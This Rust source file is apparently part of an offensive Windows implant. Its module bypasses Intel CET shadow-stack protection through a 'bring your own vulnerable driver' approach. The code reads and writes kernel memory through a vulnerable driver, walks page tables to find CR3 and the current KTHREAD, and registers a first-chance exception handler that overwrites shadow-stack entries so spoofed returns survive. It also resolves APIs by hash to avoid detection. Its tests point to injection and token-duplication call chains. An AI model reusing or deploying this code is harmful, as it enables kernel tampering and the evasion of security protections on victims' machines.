const SHADOW_STACK_OFFSETS: &[(u32, usize)] = &[
    // Windows 10 20H1 / 2004 / 20H2 / 21H1 / 21H2
    (19041, 0x0788),
    (19042, 0x0788),
    (19044, 0x0788),
    // Windows 10 22H2
    (19045, 0x0788),
    // Windows 11 21H2 (original release)
    (22000, 0x0790),
    // Windows 11 22H2
    (22621, 0x0790),
    // Windows 11 23H2
    (22631, 0x0790),
    // Windows 11 24H2
    (26100, 0x0790),
];

/// Look up the KTHREAD shadow-stack pointer offset for a given build number.
///
/// Returns the offset from the highest entry whose build ≤ the requested
/// build, or `None` if the build is older than the minimum known entry.
#[cfg(feature = "kernel-callback")]
fn shadow_stack_offset_for_build(build: u32) -> Option<usize> {
    let mut best: Option<usize> = None;
    for &(b, off) in SHADOW_STACK_OFFSETS {
        if b <= build {
            best = Some(off);
        } else {
            break; // table is sorted ascending
        }
    }
    best
}

/// Resolve the kernel base address via NtQuerySystemInformation.
///
/// Reuses the same technique as `kernel_callback::discover::get_kernel_base()`.
#[cfg(feature = "kernel-callback")]
fn get_kernel_base() -> Option<u64> {
    let mut buf_size: u32 = 0;
    unsafe {
        let _ = syscall!(
            "NtQuerySystemInformation",
            11u32, // SystemModuleInformation
            0 as *mut u8,
            0,
            &mut buf_size as *mut u32
        );
    }
    if buf_size == 0 {
        log::warn!("cet_bypass: NtQuerySystemInformation returned zero buffer size");
        return None;
    }

    let mut buffer: Vec<u8> = vec![0u8; buf_size as usize + 4096];
    let mut return_length: u32 = 0;
    let status = unsafe {
        syscall!(
            "NtQuerySystemInformation",
            11u32,
            buffer.as_mut_ptr(),
            buffer.len() as u32,
            &mut return_length as *mut u32
        )
    };
    if status < 0 {
        log::warn!("cet_bypass: NtQuerySystemInformation failed: 0x{:08X}", status as u32);
        return None;
    }

    // The first 4 bytes are the count of modules.
    let count = u32::from_le_bytes(buffer[0..4].try_into().ok()?) as usize;
    if count == 0 {
        return None;
    }

    // Each RTL_PROCESS_MODULE_INFORMATION is 296 bytes.
    // The first module is ntoskrnl.exe (or ntkrnlmp.exe).
    const MODULE_INFO_SIZE: usize = 296;
    if buffer.len() < 4 + MODULE_INFO_SIZE {
        return None;
    }

    let offset = 4 + 16; // skip ImageBase (8-byte pointer, at offset 16 within struct)
    let image_base = u64::from_le_bytes(buffer[offset..offset + 8].try_into().ok()?);
    if image_base == 0 {
        return None;
    }
    Some(image_base)
}

/// Read a u64 from kernel virtual memory via BYOVD.
///
/// Handles VA→PA translation internally when the driver requires physical
/// addresses.  Returns the value read, or None on any error.
#[cfg(feature = "kernel-callback")]
fn kernel_read_u64(
    driver: &kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_addr: u64,
) -> Option<u64> {
    let mut buf = [0u8; 8];
    if driver.needs_physical_addr {
        // Translate VA→PA via page-table walk.
        let phys = kernel_translate_va_to_pa(driver, device_handle, cr3, kernel_addr)?;
        unsafe {
            kernel_callback::deploy::read_physical_memory(driver, device_handle, phys, &mut buf).ok()?
        }
    } else {
        unsafe {
            kernel_callback::deploy::read_physical_memory(driver, device_handle, kernel_addr, &mut buf).ok()?
        }
    }
    Some(u64::from_le_bytes(buf))
}

/// Write a u64 to kernel virtual memory via BYOVD.
///
/// Handles VA→PA translation internally.  Returns true on success.
#[cfg(feature = "kernel-callback")]
fn kernel_write_u64(
    driver: &kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_addr: u64,
    value: u64,
) -> bool {
    let data = value.to_le_bytes();
    if driver.needs_physical_addr {
        let phys = match kernel_translate_va_to_pa(driver, device_handle, cr3, kernel_addr) {
            Some(p) => p,
            None => return false,
        };
        unsafe {
            kernel_callback::deploy::write_physical_memory(driver, device_handle, phys, &data).is_ok()
        }
    } else {
        unsafe {
            kernel_callback::deploy::write_physical_memory(driver, device_handle, kernel_addr, &data).is_ok()
        }
    }
}

/// Perform a 4-level x64 page-table walk to translate a kernel virtual
/// address to a physical address.
///
/// This is a self-contained implementation that mirrors
/// `kernel_callback::overwrite::translate_va_to_pa` but is accessible
/// from cet_bypass (the original is module-private).
#[cfg(feature = "kernel-callback")]
fn kernel_translate_va_to_pa(
    driver: &kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    virtual_address: u64,
) -> Option<u64> {
    let pml4_idx = (virtual_address >> 39) & 0x1FF;
    let pdpt_idx = (virtual_address >> 30) & 0x1FF;
    let pd_idx = (virtual_address >> 21) & 0x1FF;
    let pt_idx = (virtual_address >> 12) & 0x1FF;
    let offset = virtual_address & 0xFFF;

    const PFN_MASK: u64 = 0x000F_FFFF_FFFF_F000;
    const PTE_PRESENT: u64 = 1;
    const PTE_PS: u64 = 1 << 7;

    let read_entry = |phys_addr: u64, idx: u64| -> Option<u64> {
        let mut buf = [0u8; 8];
        unsafe {
            kernel_callback::deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf).ok()?
        }
        Some(u64::from_le_bytes(buf))
    };

    // Level 1 — PML4
    let pml4_base = cr3 & PFN_MASK;
    let pml4e = read_entry(pml4_base, pml4_idx)?;
    if pml4e & PTE_PRESENT == 0 {
        log::debug!("cet_bypass: PML4E not present for VA 0x{:016X}", virtual_address);
        return None;
    }

    // Level 2 — PDPT
    let pdpt_base = pml4e & PFN_MASK;
    let pdpte = read_entry(pdpt_base, pdpt_idx)?;
    if pdpte & PTE_PRESENT == 0 {
        log::debug!("cet_bypass: PDPTE not present for VA 0x{:016X}", virtual_address);
        return None;
    }
    // 1 GB large page
    if pdpte & PTE_PS != 0 {
        return Some((pdpte & 0x000F_FFFF_C000_0000) + (virtual_address & 0x3FFF_FFFF));
    }

    // Level 3 — PD
    let pd_base = pdpte & PFN_MASK;
    let pde = read_entry(pd_base, pd_idx)?;
    if pde & PTE_PRESENT == 0 {
        log::debug!("cet_bypass: PDE not present for VA 0x{:016X}", virtual_address);
        return None;
    }
    // 2 MB large page
    if pde & PTE_PS != 0 {
        return Some((pde & 0x000F_FFFF_FFE0_0000) + (virtual_address & 0x1F_FFFF));
    }

    // Level 4 — PT
    let pt_base = pde & PFN_MASK;
    let pte = read_entry(pt_base, pt_idx)?;
    if pte & PTE_PRESENT == 0 {
        log::debug!("cet_bypass: PTE not present for VA 0x{:016X}", virtual_address);
        return None;
    }

    let phys_page = pte & PFN_MASK;
    Some(phys_page + offset)
}

/// Resolve CR3 by reading PsInitialSystemProcess → EPROCESS.DirectoryTableBase.
#[cfg(feature = "kernel-callback")]
fn resolve_cr3(
    driver: &kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
) -> Option<u64> {
    // Resolve PsInitialSystemProcess symbol.
    let eprocess_ptr_addr = kernel_callback::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "PsInitialSystemProcess",
    )
    .ok()?;

    // Read the pointer to get the actual EPROCESS address.
    // PsInitialSystemProcess is a pointer — we read the raw kernel VA first
    // (most drivers handle kernel VAs via MmMapIoSpace internally).
    let mut ptr_buf = [0u8; 8];
    unsafe {
        kernel_callback::deploy::read_physical_memory(driver, device_handle, eprocess_ptr_addr, &mut ptr_buf)
            .ok()?;
    }
    let eprocess_addr = u64::from_le_bytes(ptr_buf);
    if eprocess_addr == 0 {
        log::warn!("cet_bypass: PsInitialSystemProcess is NULL");
        return None;
    }

    // _KPROCESS.DirectoryTableBase is at EPROCESS + 0x28.
    const DIRECTORY_TABLE_BASE_OFFSET: u64 = 0x28;
    let mut cr3_buf = [0u8; 8];
    unsafe {
        kernel_callback::deploy::read_physical_memory(
            driver,
            device_handle,
            eprocess_addr + DIRECTORY_TABLE_BASE_OFFSET,
            &mut cr3_buf,
        )
        .ok()?;
    }
    let cr3 = u64::from_le_bytes(cr3_buf);
    if cr3 == 0 || cr3 & 0xFFF != 0 {
        log::warn!("cet_bypass: invalid CR3 value: 0x{:016X}", cr3);
        return None;
    }

    log::debug!("cet_bypass: resolved CR3: 0x{:016X}", cr3);
    Some(cr3)
}

/// Resolve the current KTHREAD address via KiProcessorBlock → KPCR → KTHREAD.
///
/// On x64 Windows, `KiProcessorBlock` is an array of pointers to KPCR,
/// one per logical processor.  KPCR+0x188 contains the current KTHREAD.
/// We use the current processor number to index into the array.
#[cfg(feature = "kernel-callback")]
fn resolve_current_kthread(
    driver: &kernel_callback::driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_base: u64,
) -> Option<u64> {
    // Get current processor number from user mode.
    let cpu_num: u32 = unsafe {
        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))?;
        let fn_addr = pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"GetCurrentProcessorNumber\0"),
        )?;
        let get_cpu_num: unsafe extern "system" fn() -> u32 = std::mem::transmute(fn_addr);
        get_cpu_num()
    };

    // Resolve KiProcessorBlock — array of KPCR* pointers.
    let kpb_addr = kernel_callback::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "KiProcessorBlock",
    )
    .ok()?;

    // Read the KPCR pointer for our CPU: KiProcessorBlock[cpu_num].
    let kpcr_ptr = kernel_read_u64(driver, device_handle, cr3, kpb_addr + (cpu_num as u64) * 8)?;
    if kpcr_ptr == 0 {
        log::warn!("cet_bypass: KiProcessorBlock[{}] is NULL", cpu_num);
        return None;
    }

    // KPCR.CurrentThread is at offset 0x188.
    const CURRENT_THREAD_OFFSET: u64 = 0x188;
    let kthread = kernel_read_u64(driver, device_handle, cr3, kpcr_ptr + CURRENT_THREAD_OFFSET)?;
    if kthread == 0 {
        log::warn!("cet_bypass: KPCR.CurrentThread is NULL");
        return None;
    }

    log::debug!(
        "cet_bypass: resolved KTHREAD 0x{:016X} via KiProcessorBlock[{}] (KPCR 0x{:016X})",
        kthread, cpu_num, kpcr_ptr
    );
    Some(kthread)
}

/// VEH handler for CET shadow-stack violations.
///
/// When a #CP exception fires (STATUS_CONTROL_STACK_VIOLATION), this handler:
///   1. Obtains the deployed BYOVD driver.
///   2. Resolves CR3 and the current KTHREAD.
///   3. Reads the shadow-stack pointer from KTHREAD using the build-specific offset.
///   4. Walks the shadow stack to find the mismatched entry.
///   5. Overwrites it with the actual return address from the exception record.
///   6. Returns EXCEPTION_CONTINUE_EXECUTION.
///
/// If any step fails or the build is not in the offset table, returns
/// EXCEPTION_CONTINUE_SEARCH (which will crash — safer than corrupting memory).
#[cfg(feature = "kernel-callback")]
unsafe extern "system" fn veh_shadow_stack_handler(
    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
) -> i32 {
    let ep = match exception_info.as_ref() {
        Some(p) => p,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    let record = match ep.ExceptionRecord.as_ref() {
        Some(r) => r,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    // Only handle #CP exceptions (STATUS_CONTROL_STACK_VIOLATION).
    if record.ExceptionCode != STATUS_CONTROL_STACK_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context = match ep.ContextRecord.as_ref() {
        Some(c) => c,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    log::warn!(
        "cet_bypass: #CP exception at RIP=0x{:016X}, attempting shadow-stack fixup",
        context.Rip
    );

    // Step 1: Get the deployed driver.
    let deployed = match kernel_callback::deploy::get_deployed_driver() {
        Some(d) => d,
        None => {
            log::error!("cet_bypass: no BYOVD driver deployed, cannot fix shadow stack");
            return EXCEPTION_CONTINUE_SEARCH;
        }
    };
    let driver = deployed.driver; // &'static VulnerableDriver
    let device_handle = match deployed.device_handle {
        Some(h) => h,
        None => {
            log::error!("cet_bypass: no device handle in deployed driver");
            return EXCEPTION_CONTINUE_SEARCH;
        }
    };

    // Step 2: Resolve kernel base and CR3.
    let kernel_base = match get_kernel_base() {
        Some(b) => b,
        None => {
            log::error!("cet_bypass: failed to resolve kernel base");
            return EXCEPTION_CONTINUE_SEARCH;
        }
    };

    let cr3 = match resolve_cr3(driver, device_handle, kernel_base) {
        Some(c) => c,
        None => {
            log::error!("cet_bypass: failed to resolve CR3");
            return EXCEPTION_CONTINUE_SEARCH;
        }
    };

    // Step 3: Look up the shadow-stack offset for this build.
    let build = match CACHED_BUILD.get() {
        Some(&b) => b,
        None => get_windows_build(),
    };
    let ss_offset = match shadow_stack_offset_for_build(build) {
        Some(off) => off,
        None => {
            log::error!(
                "cet_bypass: build {} not in shadow-stack offset table — refusing to guess",
                build
            );
            return EXCEPTION_CONTINUE_SEARCH;
        }
    };

    // Step 4: Resolve current KTHREAD.
    let kthread = match resolve_current_kthread(driver, device_handle, cr3, kernel_base) {
        Some(t) => t,
        None => {
            log::error!("cet_bypass: failed to resolve current KTHREAD");
            return EXCEPTION_CONTINUE_SEARCH;
        }
    };

    // Step 5: Read the shadow-stack pointer from KTHREAD.
    let shadow_stack_ptr = match kernel_read_u64(
        driver,
        device_handle,
        cr3,
        kthread + ss_offset as u64,
    ) {
        Some(p) => p,
        None => {
            log::error!("cet_bypass: failed to read shadow-stack pointer from KTHREAD");
            return EXCEPTION_CONTINUE_SEARCH;
        }
    };

    if shadow_stack_ptr == 0 {
        log::error!("cet_bypass: shadow-stack pointer is NULL");
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Step 6: Walk the shadow stack to find the mismatched entry.
    //
    // The shadow stack grows downward.  The top-of-shadow-stack (current SSP)
    // is stored in the KTHREAD field we just read.  Each entry is 8 bytes.
    //
    // On a #CP violation, the shadow stack's top entry doesn't match RSP.
    // We scan a small window around the current SSP for the expected return
    // address.  The expected return address is the value on the regular stack
    // that the `ret` would pop — i.e., the value at RSP.
    let rsp = context.Rsp;
    let expected_return_addr = match std::ptr::read(rsp as *const u64) {
        addr => addr,
    };

    log::debug!(
        "cet_bypass: SSP=0x{:016X}, RSP=0x{:016X}, expected ret=0x{:016X}, RIP=0x{:016X}",
        shadow_stack_ptr, rsp, expected_return_addr, context.Rip
    );

    // Scan shadow stack entries (up to 32 entries back from current SSP).
    const MAX_SHADOW_ENTRIES: u32 = 32;
    let mut found = false;
    for i in 0..MAX_SHADOW_ENTRIES {
        let entry_addr = shadow_stack_ptr - (i as u64 + 1) * 8;
        let entry = match kernel_read_u64(driver, device_handle, cr3, entry_addr) {
            Some(v) => v,
            None => break, // Can't read further
        };

        if entry == context.Rip {
            // Found the shadow stack entry that has the old (pre-spoof) return address.
            // Overwrite it with the expected return address so the `ret` succeeds.
            log::info!(
                "cet_bypass: found mismatched shadow entry at SSP-{} (0x{:016X}): \
                 0x{:016X} → 0x{:016X}",
                i + 1,
                entry_addr,
                entry,
                expected_return_addr
            );

            if kernel_write_u64(driver, device_handle, cr3, entry_addr, expected_return_addr) {
                log::info!("cet_bypass: shadow-stack fixup successful, resuming execution");
                found = true;
            } else {
                log::error!("cet_bypass: failed to write shadow-stack fixup");
            }
            break;
        }
    }

    if found {
        EXCEPTION_CONTINUE_EXECUTION
    } else {
        log::error!("cet_bypass: could not locate matching shadow-stack entry for fixup");
        EXCEPTION_CONTINUE_SEARCH
    }
}

/// Install the VEH shadow-stack fix handler.
///
/// When the `kernel-callback` feature is enabled, this registers a VEH handler
/// that uses BYOVD primitives to fix shadow-stack mismatches on #CP exceptions.
/// Without `kernel-callback`, logs a warning that the feature is unavailable.
#[cfg(feature = "kernel-callback")]
fn install_veh_shadow_fix() {
    // Dynamically resolve AddVectoredExceptionHandler to avoid IAT entry.
    let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
        Some(b) => b,
        None => {
            log::error!("cet_bypass: failed to resolve kernel32 for AddVectoredExceptionHandler");
            return;
        }
    };

    let fn_addr = match pe_resolve::get_proc_address_by_hash(
        kernel32,
        pe_resolve::hash_str(b"AddVectoredExceptionHandler\0"),
    ) {
        Some(a) => a,
        None => {
            log::error!("cet_bypass: failed to resolve AddVectoredExceptionHandler");
            return;
        }
    };

    type FnAddVectoredExceptionHandler =
        unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32) -> *mut std::ffi::c_void;

    let add_veh: FnAddVectoredExceptionHandler = unsafe { std::mem::transmute(fn_addr) };

    // Install as first handler (first=1) so we see exceptions before anyone else.
    let handle = unsafe { add_veh(1, veh_shadow_stack_handler) };
    if handle.is_null() {
        log::error!("cet_bypass: AddVectoredExceptionHandler returned NULL");
        return;
    }

    VEH_INSTALLED.store(true, Ordering::SeqCst);
    log::info!("cet_bypass: VEH shadow-stack fix handler installed successfully");
}

/// Install the VEH shadow-stack fix handler (no-op fallback).
///
/// Without the `kernel-callback` feature, we cannot perform kernel memory
/// operations and the VEH handler would be useless.
#[cfg(not(feature = "kernel-callback"))]
fn install_veh_shadow_fix() {
    log::warn!(
        "cet_bypass: veh_shadow_fix is configured but the kernel-callback feature \
         is not enabled — shadow-stack manipulation requires BYOVD kernel access. \
         The VEH handler will not be installed."
    );
}

// ─── Helpers ───────────────────────────────────────────────────────────────

/// Get the Windows build number from KUSER_SHARED_DATA.
///
/// `KUSER_SHARED_DATA` is always mapped at `0x7FFE0000` in every process.
/// The build number is at offset `0x0260` (`NtBuildNumber` field).
fn get_windows_build() -> u32 {
    // Try reading from KUSER_SHARED_DATA first (no API call needed).
    let build_from_shared: u32 = unsafe {
        let ptr = 0x7FFE0000usize as *const u32;
        // NtBuildNumber is at offset 0x0260 in KUSER_SHARED_DATA.
        let build_ptr = ptr.add(0x0260 / 4);
        build_ptr.read_volatile()
    };

    // Sanity check: build numbers are typically 4-digit (e.g., 19041, 22631, 26100).
    // Mask off the upper bits (some versions OR with OS type flags).
    let masked = build_from_shared & 0xFFFF;
    if masked >= 10000 {
        return masked;
    }

    // P2-16: Fallback using RtlGetVersion via pe_resolve if KUSER_SHARED_DATA
    // value looks invalid.  RtlGetVersion is guaranteed to return accurate
    // version info even when compatibility manifests lie to GetVersionEx.
    log::debug!("cet_bypass: KUSER_SHARED_DATA build {} looks invalid, trying RtlGetVersion fallback", masked);

    #[cfg(target_os = "windows")]
    {
        #[repr(C)]
        struct OsVersionInfoExW {
            dw_os_version_info_size: u32,
            dw_major_version: u32,
            dw_minor_version: u32,
            dw_build_number: u32,
            dw_platform_id: u32,
            sz_csd_version: [u16; 128],
        }

        let ntdll_hash = pe_resolve::hash_wstr(&"ntdll.dll\0".encode_utf16().collect::<Vec<u16>>());
        if let Some(ntdll_base) = pe_resolve::get_module_handle_by_hash(ntdll_hash) {
            let fn_hash = pe_resolve::hash_str(b"RtlGetVersion\0");
            if let Some(fn_addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash) {
                type FnRtlGetVersion = unsafe extern "system" fn(*mut OsVersionInfoExW) -> i32;
                let rtl_get_version: FnRtlGetVersion = unsafe { std::mem::transmute(fn_addr as *mut _) };
                let mut version_info = OsVersionInfoExW {
                    dw_os_version_info_size: std::mem::size_of::<OsVersionInfoExW>() as u32,
                    dw_major_version: 0,
                    dw_minor_version: 0,
                    dw_build_number: 0,
                    dw_platform_id: 0,
                    sz_csd_version: [0u16; 128],
                };
                let status = unsafe { rtl_get_version(&mut version_info) };
                if status >= 0 && version_info.dw_build_number >= 10000 {
                    log::debug!(
                        "cet_bypass: RtlGetVersion fallback returned build {}",
                        version_info.dw_build_number
                    );
                    return version_info.dw_build_number;
                }
            }
        }
        log::warn!("cet_bypass: RtlGetVersion fallback failed, returning 0");
    }

    0
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cet_action_debug() {
        assert_eq!(format!("{:?}", CetAction::Proceed), "Proceed");
        assert_eq!(format!("{:?}", CetAction::UseCallChain), "UseCallChain");
        assert_eq!(format!("{:?}", CetAction::Abort), "Abort");
    }

    #[test]
    fn test_call_chain_registry() {
        // Verify that call chains exist for expected functions.
        assert!(CALL_CHAINS.contains_key("NtWriteVirtualMemory"));
        assert!(CALL_CHAINS.contains_key("NtReadVirtualMemory"));
        assert!(CALL_CHAINS.contains_key("NtAllocateVirtualMemory"));
        assert!(CALL_CHAINS.contains_key("NtOpenProcess"));
        assert!(CALL_CHAINS.contains_key("NtClose"));
        assert!(CALL_CHAINS.contains_key("NtQueryVirtualMemory"));
    }

    #[test]
    fn test_has_call_chain() {
        assert!(has_call_chain("NtWriteVirtualMemory"));
        assert!(has_call_chain("NtCreateThreadEx")); // Chain via CreateRemoteThreadEx
        assert!(has_call_chain("NtDuplicateToken")); // Chain via DuplicateTokenEx
        assert!(!has_call_chain("NtCreateFile")); // No chain registered
    }

    #[test]
    fn test_status_json_format() {
        let json = status_json();
        assert!(json.contains("\"cet_state\":"));
        assert!(json.contains("\"build\":"));
        assert!(json.contains("\"initialized\":"));
        assert!(json.contains("\"bypass_enabled\":"));
        assert!(json.contains("\"veh_installed\":"));
    }

    #[test]
    fn test_cet_state_constants() {
        assert_eq!(CET_DISABLED, 0);
        assert_eq!(CET_ENABLED_CAN_DISABLE, 1);
        assert_eq!(CET_ENABLED_CANNOT_DISABLE, 2);
    }
}
